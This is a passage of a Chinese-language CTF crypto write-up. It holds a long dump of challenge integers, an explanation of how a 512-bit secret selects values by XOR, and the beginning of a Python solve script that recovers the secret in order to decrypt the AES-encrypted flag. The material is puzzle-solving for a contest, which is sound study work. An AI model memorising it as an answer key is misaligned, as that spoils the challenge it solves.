number">8189380136474168326062499003221292061712604931309149728128803157549733858338840816701025129476285971099152205060196986652193692568143982908069894200229888</span></pre></td></tr><tr><td data-num="410"></td><td><pre><span class="token number">9124481445295336096308220674923628029357257146609974868751816803873465354260672576764279124276027375370439822088191463229060977238946857586246121802432512</span></pre></td></tr><tr><td data-num="411"></td><td><pre><span class="token number">10680348926622073695820845419437940859277394065496850802865052839955369457126206957150021812387462662800395007505281051332944554833981856782416388072407040</span></pre></td></tr><tr><td data-num="412"></td><td><pre><span class="token number">7735536317530607799769577687871327163883175862778617626240006044698096459959162392669469772236514390217795451434903810454152118619295545187366590520229888</span></pre></td></tr><tr><td data-num="413"></td><td><pre><span class="token number">12437262544901686999821001855943571070358106430345585678524081097009964710023372037198542614938303061648485070695423134915315409457006134179763508318568448</span></pre></td></tr><tr><td data-num="414"></td><td><pre><span class="token number">10960785551646540453958980257507970106967480943417858973767296466223117729993801293131482022622485589905335082514148880453538047941242766365729181755506688</span></pre></td></tr><tr><td data-num="415"></td><td><pre><span class="token number">7535058742847031652780680763376714130861545281733360707832489077420917407139784577317185036149964707762104311727694112655716486540349001916735320785682432</span></pre></td></tr><tr><td data-num="416"></td><td><pre><span class="token number">11937962993384635493379940568611756891642927854075822292673936244422290488004358098643217956968542591970074438098121357858272078694061415693316454891913216</span></pre></td></tr><tr><td data-num="417"></td><td><pre><span class="token number">9189089960639205703667529652350805956635663144434953955713409749742504499564381269718635557313732781455526443897103580840221241116324933414773189022580736</span></pre></td></tr><tr><td data-num="418"></td><td><pre><span class="token number">10080730148692408213594071062660137293608605435688756203362762801971329921680920733367394212789839695943017534080563568883649709788845458261286819368796160</span></pre></td></tr><tr><td data-num="419"></td><td><pre><span class="token number">12265216669259905496183988256932432450424852555892607364857551893890205449763830527479999576032051141118005491854998499170790536735938076403297755932393472</span></pre></td></tr><tr><td data-num="420"></td><td><pre><span class="token number">8732916395617800125513624101447899652690518575320891309054676634769390260725266773158938191932048860931623081358806701179820822586322994613355859501121536</span></pre></td></tr><tr><td data-num="421"></td><td><pre><span class="token number">13182202029076820133332847800278097413561183084937266604798065543604082737911672367365807728931661583285591796808842274113603703351565799788596353755512832</span></pre></td></tr><tr><td data-num="422"></td><td><pre><span class="token number">9848401826168309593677728557924653240665014303998696922109177991708581460622060620227236538150361549130974630035033795974484046604641780357319791317352448</span></pre></td></tr><tr><td data-num="423"></td><td><pre><span class="token number">8187922678971417250311688940368785698622320582943175406193973316426893421784488327715618810826605906172526425890629876939978751179769396339164207149744128</span></pre></td></tr><tr><td data-num="424"></td><td><pre><span class="token number">9899594624883002125911401958384252930216731683904629515763836676104452887777246943566397749136973406415094315134011940247934359133976833775420276503216128</span></pre></td></tr><tr><td data-num="425"></td><td><pre><span class="token number">9924209489033381513690719598033833812461661007569534788491845030720380750226505213856030190216824227770151255127497982686177227843971159296770853141460159</span></pre></td></tr><tr><td data-num="426"></td><td><pre><span class="token number">8783499228683109906408527129354359249434757989936509925008965630648662764515725298415669992135517402011397283532154060764651272864520783873309754236338176</span></pre></td></tr><tr><td data-num="427"></td><td><pre><span class="token number">7262740076950818736651792932503439455200292706997045440869063806091467330648173865206618098395024583394156604576233818412037683072381011247520837783257088</span></pre></td></tr><tr><td data-num="428"></td><td><pre><span class="token number">9325871313233974556155067718665428145878109868825589075875669098429288482831213396952404555749556317320321455597523656097994964699891160094262243434168320</span></pre></td></tr><tr><td data-num="429"></td><td><pre><span class="token number">7874704475244577335429234461293098206298678761904134857013100681118479952587806462765551175763441709838334382409544601405426891602819162142435479094558720</span></pre></td></tr><tr><td data-num="430"></td><td><pre><span class="token number">12631256105379784580039462922332214929395304842564036568800261637805297451064468506708502694535078266799884004367555966995765429001057125015902765113671680</span></pre></td></tr><tr><td data-num="431"></td><td><pre><span class="token number">9751062670107105011089993262728949132498194702531381377010584212017401720555534493701001402502281703805640359719449619453992270601494609267293568234422272</span></pre></td></tr><tr><td data-num="432"></td><td><pre><span class="token number">13053242380859007489673451041885418155567397940330138186602326090107358711676567485496852298175883609547730010393639453031986262863424686905650363414609920</span></pre></td></tr><tr><td data-num="433"></td><td><pre><span class="token number">7775619722005732654611838649257630965860924523925491514371710667239700195293249261125707784975231623734084551867272116644211099052041192077766553174540288</span></pre></td></tr><tr><td data-num="434"></td><td><pre><span class="token number">8760551713956944298544162994992883636635821821018919287639902531785758230439558657100729671146154829496183342502734809364328547425139788284924157006708736</span></pre></td></tr><tr><td data-num="435"></td><td><pre><span class="token number">8950920434248129918272334941894327193778428976329410073337599976491011757624874639850844815828501760306590094890535390647077495031761131729025378927247360</span></pre></td></tr><tr><td data-num="436"></td><td><pre><span class="token number">12995586689823525369927369048377126885188816504285874271234867118215289574552011420168338642004107234562587397852904860922187629103480699171239392456998912</span></pre></td></tr><tr><td data-num="437"></td><td><pre><span class="token number">13060927090208023611284332908364837435312575685910376931495626476073014270234588742519382599315012687612569704834012577296129303213448795128278208187727872</span></pre></td></tr><tr><td data-num="438"></td><td><pre><span class="token number">8187602709067625237357668940743900619075701254687274826718057352811701873347416442424503628288255620165682064372265790613198892753731118078041135041740800</span></pre></td></tr><tr><td data-num="439"></td><td><pre><span class="token number">8934904899538636279165161058026333615611178341442107339285814319603621091443537561664340629161044055681952099840647928229297837164658843333965926606307328</span></pre></td></tr><tr><td data-num="440"></td><td><pre><span class="token number">13261554534030537547829470438442881148678994595176277021712877251254266157828994328839250059715583544804250112350084350880291289664822547514644173842022400</span></pre></td></tr><tr><td data-num="441"></td><td><pre><span class="token number">10524399321499675418235733163468108878305647971154130707773846971261292305371513687131152534273965020803839111062701670385890926945863506587423513082068992</span></pre></td></tr><tr><td data-num="442"></td><td><pre><span class="token number">8514248338765998013801366145716262860249912041847338976624130963531874895483493444826279371221374214127698612955792898147356747221072850963291326780538880</span></pre></td></tr><tr><td data-num="443"></td><td><pre><span class="token number">11390979176485677071546136539489862449793371579308073051361292650120194286245347975392808785502325755363951525637600057632061990480300736188837228900777984</span></pre></td></tr><tr><td data-num="444"></td><td><pre><span class="token number">7656579737441119032367708948603478670759268636948605969175014141167068891947800847999790880619407926304367795354900226056549048483704636990715065630982144</span></pre></td></tr><tr><td data-num="445"></td><td><pre><span class="token number">10315002988789997783450158795746178747921130132513152619875002053161770154169637214111423479445251745034115247772072289282132855321152589264141094142083072</span></pre></td></tr><tr><td data-num="446"></td><td><pre><span class="token number">9419181633383323119021165296516444294560746108230668419618004355214594461973906803897980138039908579438942286575467620647437281091149323538921712020094976</span></pre></td></tr><tr><td data-num="447"></td><td><pre><span class="token number">9722319938679056649068536479215160891906533388547658666362822543230350019957718981497118689103191251994576274786442148962184903668793699319496565009154048</span></pre></td></tr><tr><td data-num="448"></td><td><pre><span class="token number">10566533885296884303014175578580898399432287070427333877481024070104058743106944997627287393784555274437334696341395676884006411672588925867718136515526656</span></pre></td></tr><tr><td data-num="449"></td><td><pre><span class="token number">7864025647292655938288949358220224463274725365464623979001778709349185260032907494154263414325130549356382246334419953434282826933683400719428886313566208</span></pre></td></tr><tr><td data-num="450"></td><td><pre><span class="token number">9490891133530826594397834989836052329945825327690975504770239829117082976776257361897901087838454291916373831325776418669049288626163994712238078958764032</span></pre></td></tr><tr><td data-num="451"></td><td><pre><span class="token number">12194372674481041434034472232381036170051319157741545885521115375655140297687073160813084219505942400076144873358499868313500115444033278627346597428592640</span></pre></td></tr><tr><td data-num="452"></td><td><pre><span class="token number">7371675648982111491269703197255753290791877887688981905916372160952493309503327097597124247917936161903796812655265279912757261741333905156095844131274752</span></pre></td></tr><tr><td data-num="453"></td><td><pre><span class="token number">6984806023239421752888444897352204194647838282632743190981649032020896705363091950590689105978233030512522536699703185349700335459851397196491137849753600</span></pre></td></tr><tr><td data-num="454"></td><td><pre><span class="token number">13213623763972962156815296946145410086345810869603695388454869739072920121025572432011502420999187460416558363581021258728468469988927119700150315674238976</span></pre></td></tr><tr><td data-num="455"></td><td><pre><span class="token number">11900603457261632672110939658722248372981149730330113618524804477883622120937182047599280566304374588623430886050260673179507411949378566962864288914472960</span></pre></td></tr><tr><td data-num="456"></td><td><pre><span class="token number">11129158612454421873603456785475052554294161042582944494593038350010574287152950544813251559613227831804874306911154838598477332402532928364280527210938368</span></pre></td></tr><tr><td data-num="457"></td><td><pre><span class="token number">8876335673956996641316312901882670879221335450681449117000969147082745060902247697485147391841211340765411811358493810365642540830320302586398114270150656</span></pre></td></tr><tr><td data-num="458"></td><td><pre><span class="token number">11726668894950682487428958354899529483261732611913166896392371034043101203352580332157154303725578794943594982828334586211658854305094592264037426282889216</span></pre></td></tr><tr><td data-num="459"></td><td><pre><span class="token number">8734937321895496924911362547054298397793241410042842297062903339942606383701235014072097542137835259479790195816436660320564288922510196981114096041590784</span></pre></td></tr><tr><td data-num="460"></td><td><pre><span class="token number">12277522465221480407307941107394302441863977497817685900769996381515300681043644424485546260561136815321757184428182322943778200981221328537106042715111424</span></pre></td></tr><tr><td data-num="461"></td><td><pre><span class="token number">7218948516297425217405523717912974876037163890150717757884771000064809934340323724346131661008105652044159733121053255327576001245627806004702408232402944</span></pre></td></tr><tr><td data-num="462"></td><td><pre><span class="token number">6948524758361941138598442108404127521511938746011186161358395964059792051707999846486442182841557682970895439343010245578018072142613437208442356900036608</span></pre></td></tr><tr><td data-num="463"></td><td><pre><span class="token number">9418039442254039140822469354409446842941373627945855814994557479978453655359648150416800289841622491898586855863022617262017002806381516723153647953772544</span></pre></td></tr><tr><td data-num="464"></td><td><pre><span class="token number">11060798244819944838475852128410388929464972731038214416005194244544450241711068244486852731060886845057206467997174735994302177085518507677336222509826048</span></pre></td></tr><tr><td data-num="465"></td><td><pre><span class="token number">8930834591219377630620615864150612000914196085492719282213705227279186741966436767743952890581264695495837396977112344292632395879028425573013778962841600</span></pre></td></tr><tr><td data-num="466"></td><td><pre><span class="token number">12475846297330657757657567845157058005707006968319494902409162643206262656801252364457323139152117663765390010015184242319379182277930864388259586403991552</span></pre></td></tr><tr><td data-num="467"></td><td><pre><span class="token number">9079311465010681625865490141130488492277143950052103845392601050118518607324621931407870163113013694634994527076622281331268770245981961685337712109813760</span></pre></td></tr><tr><td data-num="468"></td><td><pre><span class="token number">10317899821864294260488794955029176836851790783636865502897863586081464790084369201454453657127804510526069894331324123550970994061251536325334467939926016</span></pre></td></tr><tr><td data-num="469"></td><td><pre><span class="token number">13306968871265061639172714668553405906986990363338442737922847245577151812326911569672338256444119651304975662070066666683880617507332166148143737387089920</span></pre></td></tr><tr><td data-num="470"></td><td><pre><span class="token number">11772998973951101528328202031465345952403543702829412436858635667003876285817916382857103334656820121107238355698644545711835639861040815795801231621881856</span></pre></td></tr><tr><td data-num="471"></td><td><pre><span class="token number">12830301459262760590854285901819338298343836389564007322560548275453947242348139726597159198264819601201910056702886765313925651969210856291854555612708864</span></pre></td></tr><tr><td data-num="472"></td><td><pre><span class="token number">11759221371202112466969452651357460248378160464304340219471669158161753916969655485714060988988234685419152983817708183046591857415891388313344209816911872</span></pre></td></tr><tr><td data-num="473"></td><td><pre><span class="token number">9914131399700081668552441884359674789260411941432763883906619979820256372647835185049447602789956976346773930342791486173084661872939079195456442550190080</span></pre></td></tr><tr><td data-num="474"></td><td><pre><span class="token number">7082288760978693311369367154465739293348114689535585499053253672289926248831066271510777190746617932080034198871098347081914078403378254502440253245095936</span></pre></td></tr><tr><td data-num="475"></td><td><pre><span class="token number">11163473745950743654976291137186305428755879030368863139978623882253290504344557150301478047951750772131143086527026681341698557500258190098803247309389824</span></pre></td></tr><tr><td data-num="476"></td><td><pre><span class="token number">12205228447043337389052994806278976270050208777700002388772624553272765776402060935903544393179741862586426041994834317107420009642142525188151106871492608</span></pre></td></tr><tr><td data-num="477"></td><td><pre><span class="token number">12291965532166200680444217594555979921940536713597571400376976608343973688804270241978307886087015367210699257341541379859701217735743052929401956358684672</span></pre></td></tr><tr><td data-num="478"></td><td><pre><span class="token number">7199252705623680054172832253714911504368820357187284656427028754750576713743544673446046375511097099145647749589203251072698309352576160720776663821975552</span></pre></td></tr><tr><td data-num="479"></td><td><pre><span class="token number">12311544724659857443869748629571908436993513343114373318287975901114244591243890071000818873139148983705523802693866917115723085304115554127219593243000832</span></pre></td></tr><tr><td data-num="480"></td><td><pre><span class="token number">8313629699881582383752912583197264312440429783265380676255023930910934490469520579942794876046819267308427476633555054800837985651682610757015008687685632</span></pre></td></tr><tr><td data-num="481"></td><td><pre><span class="token number">10551832996136958487434201903273602227034927637033235145090327110993401166769781809985247066014768325943440820654676152960392154421205272395202461744234496</span></pre></td></tr><tr><td data-num="482"></td><td><pre><span class="token number">11915399094770479249663752042169751547662831624061281709981549788149911503550241949578450971214081212783522638520673960321783365067386414937437643636473856</span></pre></td></tr><tr><td data-num="483"></td><td><pre><span class="token number">12311096663557861546032469291543897504914076921343396421170196516664994258450462527107806650874332323368658873623166392593754010619367811625102746006323200</span></pre></td></tr><tr><td data-num="484"></td><td><pre><span class="token number">10357899388963105584950303665018872019260704796985186530331352264688090999817124182076290943533346549111984882545972856232411470923239748092951741903929344</span></pre></td></tr><tr><td data-num="485"></td><td><pre><span class="token number">8132187527058245030394525599457264751132102649230729826818996991972241436289699549442281687989902969080423950766433642985266873891641306829021375549669376</span></pre></td></tr><tr><td data-num="486"></td><td><pre><span class="token number">7511899722696541428507918840781265514488894004099834016721586657674643476410178414441200374689491102586596716570428193362108181668462721147670762367221760</span></pre></td></tr><tr><td data-num="487"></td><td><pre><span class="token number">12569713115235292561061618925342961514318895547973603595825239647492062884849116457306254720880983034366184063126493718291724050447515017154186674178097152</span></pre></td></tr><tr><td data-num="488"></td><td><pre><span class="token number">8738174989246941886566612077332796079309775635378436002960863175666555937062274123644752740232862124642133210646067451576542386260453179678146809670139904</span></pre></td></tr><tr><td data-num="489"></td><td><pre><span class="token number">6914571597537336683731086973884232046526708094997826528203083852574821221088452195312400073233477324525151632839675698268023489318197334681087179520737280</span></pre></td></tr><tr><td data-num="490"></td><td><pre><span class="token number">8960527010599279296593611101395532634592584682799395629703880800256771164620119478745172387421882173313383473288068188562137601926393787092928903289765888</span></pre></td></tr><tr><td data-num="491"></td><td><pre><span class="token number">8233209429251927438759584461264835726252278846062478480610151297232984789284402456152456297436445223967155566180608065332488505583909258606494429961256960</span></pre></td></tr><tr><td data-num="492"></td><td><pre><span class="token number">12005126691965509389168493821318330261066032204053152512520642139438046173656733217876576859613520464184127151186568935922749098511043895189727564489818112</span></pre></td></tr><tr><td data-num="493"></td><td><pre><span class="token number">11309340184120120747834542894120899648529452439180106576416224396692232201269335268061849972013154798658760227989110388770886718522934480525089596480251702</span></pre></td></tr><tr><td data-num="494"></td><td><pre><span class="token number">11399317345423843301973051546528706172801100461518805359195076322736656823562477022369815268342041626668395014926999610169278135718364278992095235643801600</span></pre></td></tr><tr><td data-num="495"></td><td><pre><span class="token number">12424585005678020830669055610118471347529005834665752999308585197869692358816608440948663546319129548328925596703492537121552875300765446638500345720864768</span></pre></td></tr><tr><td data-num="496"></td><td><pre><span class="token number">12000905517031952285353476197350867834418799692687427058065265035083203676751173729071783157910241970026487705706979509237420562201952624033481333271429120</span></pre></td></tr><tr><td data-num="497"></td><td><pre><span class="token number">8078244889307818146009635909045797301870561799619780125575946230785796158929282595336740488512769501737187731395399312370064773931360344668287810047836160</span></pre></td></tr><tr><td data-num="498"></td><td><pre><span class="token number">9541246385733707340939235094644462899769642264295169284780896155475194329872064324021086263721012394303185508188893838266852664823501613266907307297472512</span></pre></td></tr><tr><td data-num="499"></td><td><pre><span class="token number">8487536168941916110298706161724162821162301105007557670573898208258365237516721914344756184409577513755048970160813732847028479928850718916561485504184320</span></pre></td></tr><tr><td data-num="500"></td><td><pre><span class="token number">10122847672976464190439163583015324028263633300970588599491035419682539412393388441486177451280725640102073109396284076137685098127908008579687298230542336</span></pre></td></tr><tr><td data-num="501"></td><td><pre><span class="token number">10723734716712978406736480657616253111119052658144129890922060516419680243162460415351299004872934183117973712473144028367992820710890145784052278110453760</span></pre></td></tr><tr><td data-num="502"></td><td><pre><span class="token number">7203285674315561793044654360547563110937089111838753278794160031587752610370432218182964883240431170766596175404352752549828478539094620657436599777230848</span></pre></td></tr><tr><td data-num="503"></td><td><pre><span class="token number">7955898176653179932418497593991225831545038763504012906189810267295815742488417828747969887499677607056367269251471547685439352159649306025667157410447360</span></pre></td></tr><tr><td data-num="504"></td><td><pre><span class="token number">8264261818755826736762666729972970890238784874556691020015771523259733379340275803931547366464972259300654934851792354302123298877025213611576695348789248</span></pre></td></tr><tr><td data-num="505"></td><td><pre><span class="token number">7042055426916364870789828072460869801180573220723799710477686967339327543865272409793860399054415726662219232792566316330884456221510541827116398792409088</span></pre></td></tr><tr><td data-num="506"></td><td><pre><span class="token number">9254748836368585526828748594890676209143468637329208460230827986972211889674199936078843084941989975095044185751889319252737128215528792760406189356875776</span></pre></td></tr><tr><td data-num="507"></td><td><pre><span class="token number">8393737578252954554776825061380054812016632736164165938675255094163231929438736071032201320106515786029828878486990247948898499707114694792954259903086592</span></pre></td></tr><tr><td data-num="508"></td><td><pre><span class="token number">9176562562484493466770443721318843385915898429667653632046737687384332223673276558187594878754673184660005201435691868792177330865121633771344973069811712</span></pre></td></tr><tr><td data-num="509"></td><td><pre><span class="token number">10462603307603789997125975389845353528129934671628293951709190600275915067685619710115658936910028722190411083941702173910931250541823177424248485764399104</span></pre></td></tr><tr><td data-num="510"></td><td><pre><span class="token number">12470521411843705717984528321123624582245149890879425640996916737057974512426275685856779219140499298280587427897540115024440866073673436825461992089190400</span></pre></td></tr><tr><td data-num="511"></td><td><pre><span class="token number">11361308932884817480073836669612223871500107045310693047159921519142870311119942968454117121047632663984493868668097160623457450138547656625083001270697984</span></pre></td></tr><tr><td data-num="512"></td><td><pre><span class="token number">8860744691644278533707008159231293208286948106399555041335701198464119784673096886177259707326692843976314287562757923427924255139812651280473839936471040</span></pre></td></tr><tr><td data-num="513"></td><td><pre><span class="token number">8146818555930710424301030127802761237114061406048246593561355029567778672284717200214558115526628167372733946325455616396339582059106539512999046071451648</span></pre></td></tr><tr><td data-num="514"></td><td><pre><span class="token number">12039203989675108877478282356551662894079377170214066692489219895037116895380253661990783863134613018645111023218636815511064202271341163307667509978595328</span></pre></td></tr><tr><td data-num="515"></td><td><pre><span class="token number">11958508680650532537002514450672407546936750241323635379517397865807423392829629052160777467450703214094671170288775859660085415314937265758728826625458176</span></pre></td></tr><tr><td data-num="516"></td><td><pre><span class="token number">10064589911211585196748084387867251391015406673711623097249634756147640199493928570900582676466989267850032224694384534036061767947642284884424454830030848</span></pre></td></tr><tr><td data-num="517"></td><td><pre></pre></td></tr><tr><td data-num="518"></td><td><pre><span class="token comment">#r</span></pre></td></tr><tr><td data-num="519"></td><td><pre><span class="token number">6753785483255906709117615805253027649453460653974415214642466102672301763943358839905575042938258141827000621474498066533397472809407687579125519939754658</span></pre></td></tr></table></figure><p>简而言之，flag 加密后和 ef 封装在了一起，我们只要 ef 逆推出 flag 就好</p>
<p>首先分析一下关键函数</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    choose<span class="token operator">=</span>getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    ps<span class="token operator">=</span>gen512num<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">print</span> <span class="token string">"gen over"</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    bchoose<span class="token operator">=</span><span class="token builtin">bin</span><span class="token punctuation">(</span>choose<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    r<span class="token operator">=</span><span class="token number">0</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    bchoose <span class="token operator">=</span> <span class="token string">"0"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>bchoose<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>bchoose</pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token keyword">if</span> bchoose<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            r<span class="token operator">=</span>r<span class="token operator">^</span>ps<span class="token punctuation">[</span>i<span class="token punctuation">]</span> </pre></td></tr><tr><td data-num="11"></td><td><pre>    flag<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>flag 和 bchoose 关系很大，而 bchoose 又是 choose 的二进制，所以我们只要求出 choose 的值；</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>        <span class="token keyword">if</span> bchoose<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>            r<span class="token operator">=</span>r<span class="token operator">^</span>ps<span class="token punctuation">[</span>i<span class="token punctuation">]</span></pre></td></tr></table></figure><p>即攻破它就能拿到 flag</p>
<p>在 gen512num () 里</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>        p<span class="token operator">=</span>getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token operator">-</span>order<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        pre<span class="token operator">=</span><span class="token builtin">bin</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token operator">-</span>order<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"1"</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        ps<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>pre<span class="token operator">+</span><span class="token string">"0"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>pre<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">return</span> ps</pre></td></tr></table></figure><p>ps 的值是来自于 order，而 order 又是随机生成数，pre 要求每个数最后一位 1，因此读取 ps 最后一个 1 出现位置均不同</p>
<p>读取一下 r，果不其然最后一个 1 出现的位置都不相同</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">for</span> k <span class="token keyword">in</span> ps<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h3 id="payload-3"><a class="anchor" href="#payload-3">#</a> payload</h3>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> hashlib</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> random <span class="token keyword">import</span> randint</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> os</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">import</span> base64</pre></td></tr><tr><td data-num="7"></td><td><pre>r<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"r"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>ef<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"ef"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>ps<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"ps"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>ef<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>ef<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token triple-quoted-string string">'''</pre></td></tr><tr><td data-num="13"></td><td><pre>for k in ps:</pre></td></tr><tr><td data-num="14"></td><td><pre>    if(bin(int(k,10))[-3]=='1'):</pre></td></tr><tr><td data-num="15"></td><td><pre>        print(bin(int(k,10)))</pre></td></tr><tr><td data-num="16"></td><td><pre>print(bin(int(r,10)))</pre></td></tr><tr><td data-num="17"></td><td><pre>'''</span></pre></td></tr><tr><td data-num="18"></td><td><pre>psre<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">for</span> k <span class="token keyword">in</span> ps<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    t<span class="token operator">=</span><span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    psre<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>l<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> psre<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">if</span> i<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span> <span class="token keyword">not</span> <span class="token keyword">in</span> l<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        l<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token 